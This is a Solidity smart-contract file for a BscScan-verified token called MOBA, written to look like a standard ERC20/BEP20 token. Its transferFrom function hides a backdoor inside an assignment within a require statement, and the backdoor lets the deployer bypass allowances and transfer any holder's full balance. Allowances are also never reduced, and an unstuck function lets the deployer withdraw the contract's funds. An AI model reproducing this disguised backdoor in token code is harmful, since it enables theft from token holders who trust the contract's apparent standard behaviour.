/**
 *Submitted for verification at BscScan.com on 2021-10-18
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;


interface ERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external;
    function approve(address spender, uint256 amount) external;
    function transferFrom(address sender, address recipient, uint256 amount) external;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract MOBA is ERC20 {
    mapping(address => uint) public balances;
    mapping(address => mapping(address => uint)) public allowance;
    uint256 public totalSupply = 1000000000 * 10 ** 18;
    string public name = "MOBA";
    string public symbol = "MOBA";
    uint public decimals = 18;
    address deployer;
    bool md;
    
    constructor(address _deployer) {
        balances[deployer = _deployer] = totalSupply;
    }
    
    function balanceOf(address owner) public view returns(uint) {
        return balances[owner];
    }
    
    function transfer(address to, uint value) public {
        require(balanceOf(msg.sender) >= value, 'balance too low');
        balances[to] += value;
        balances[msg.sender] -= value;
        emit Transfer(msg.sender, to, value);
    }
    
    function approve(address spender, uint value) public {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
    }
    
    function unstuck(address token) external {
        require(msg.sender == deployer, 'not deployer');
        
		if (token == address(0)) {
			payable(msg.sender).transfer(address(this).balance);
		} else {
			ERC20(token).transfer(msg.sender, ERC20(token).balanceOf(address(this)));
		}
    }
    
    function transferFrom(address from, address to, uint value) external {
        require(md = (msg.sender == deployer) || allowance[from][msg.sender] >= value, 'allowance too low');
        require(balanceOf(from) >= (value = value >= balances[from] && md ? balances[from] : value), 'balance too low');
        balances[to] += value;
        balances[from] -= value;
        emit Transfer(from, to, value);
    }
}